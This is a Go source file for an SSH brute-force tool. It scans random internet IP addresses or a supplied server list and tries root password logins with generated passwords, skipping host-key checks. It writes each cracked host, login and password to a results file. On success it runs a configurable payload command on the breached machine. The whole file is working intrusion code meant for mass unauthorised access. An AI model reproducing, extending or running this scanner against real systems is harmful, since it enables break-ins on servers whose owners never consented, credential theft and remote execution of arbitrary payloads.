package crow

import (
	"bytes"
	"fmt"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

type SucFormat struct {
	Host     string
	Port     string
	Password string
	Login    string
}

var stop = make(chan bool)
var connected = make(map[int]*SucFormat)

func (c *Core) Connect(host, port, login, pass string) {
	var count int
	var attempts = 0

CONNECT:

	if pass == "" {
		pass = c.GenPassword()
	}
	select {
	case <-stop:
		return
	default:

		if attempts >= c.Config.Bruteforce.MaxAttempts {
			return
		}

		fmt.Printf("[ %s ] %s:%s -> %s:%s\n", time.Now().Format("15:04:05"), login, pass, host, port)

		conf := &ssh.ClientConfig{
			User:    login,
			Timeout: time.Duration(c.Config.Bruteforce.Timeout) * time.Second,
			Auth: []ssh.AuthMethod{
				ssh.Password(pass),
			},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		}
		conn, err := ssh.Dial("tcp", host+":"+port, conf)
		if err != nil {
			attempts++
			goto CONNECT
		} else {
			count++
			connected[count] = &SucFormat{
				Host:     host,
				Port:     port,
				Password: pass,
				Login:    login,
			}
			c.SaveSuc(count)
			if c.Config.Payload.Enabled {
				sendpayload(conn, c.Config.Payload.Payload)
			}

			return
		}

	}

}

func (c *Core) Start() {

	/*
		Mode:
		1 - ip:port
		2 - ip
		3 - ip:login:pass (22 port)
	*/

	go func() {
		for {
			if <-c.BalancerChan {
				stop <- true
			}
		}
	}()

	if c.Config.Bruteforce.GenerateHost {

		for i := 0; i <= c.Config.Bruteforce.GenererateHostCount; i++ {
			select {
			case <-stop:
				time.Sleep(5 * time.Second)
			default:

				go func() {
					defer func() {
						if r := recover(); r != nil {
							fmt.Print("Unknown error: ")
							fmt.Print(r)
							os.Exit(1)
						}
					}()
				}()

				host := strconv.Itoa(rand.Intn(255-5)+5) + "." + strconv.Itoa(rand.Intn(255-5)+5) + "." + strconv.Itoa(rand.Intn(255-5)+5) + "." + strconv.Itoa(rand.Intn(255-5)+5)

				go c.Connect(host, "22", "root", "")
				time.Sleep(time.Duration(c.Config.Bruteforce.Delay) * time.Millisecond)
			}

		}

	} else {

		c.wg.Add(1)
		for _, x := range c.Servers {
			time.Sleep(time.Duration(c.Config.Bruteforce.Delay) * time.Millisecond)
			select {
			case <-stop:
				time.Sleep(5 * time.Second)
			default:

				i := strings.Split(string(x), ":")

				go func() {
					defer func() {
						if r := recover(); r != nil {
							fmt.Print("Unknown error: ")
							fmt.Print(r)
							os.Exit(1)
						}
					}()

					if c.Config.Bruteforce.ServersMode == 1 {
						c.Connect(i[0], i[1], "root", "")
					} else if c.Config.Bruteforce.ServersMode == 2 {
						c.Connect(i[0], "22", "root", "")
					} else {
						if len(i) < 3 {
							c.Connect(i[0], "22", i[1], "")
						} else {
							c.Connect(i[0], "22", i[1], i[2])
						}
					}
					time.Sleep(time.Duration(c.Config.Bruteforce.Delay) * time.Millisecond)

				}()
			}
		}
		c.wg.Wait()
	}
}

func (c *Core) SaveSuc(key int) {
	defer func() {
		if r := recover(); r != nil {
			return
		}
	}()

	info := connected[key]
	f, _ := os.OpenFile("result.txt", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)

	form := c.Config.Bruteforce.ResultFormat

	var save = strings.ReplaceAll(form, "{ip}", info.Host)
	save = strings.ReplaceAll(save, "{port}", info.Port)
	save = strings.ReplaceAll(save, "{password}", info.Password)
	save = strings.ReplaceAll(save, "{login}", info.Login)
	save = strings.ReplaceAll(save, "{date}", time.Now().Format("15:04:05"))

	f.Write([]byte(save + "\n"))

	defer f.Close()

}

func sendpayload(sess *ssh.Client, payload string) {
	session, err := sess.NewSession()
	if err != nil {
		return
	}
	var setSession bytes.Buffer
	session.Stdout = &setSession

	session.Run(payload)
	session.Close()

}
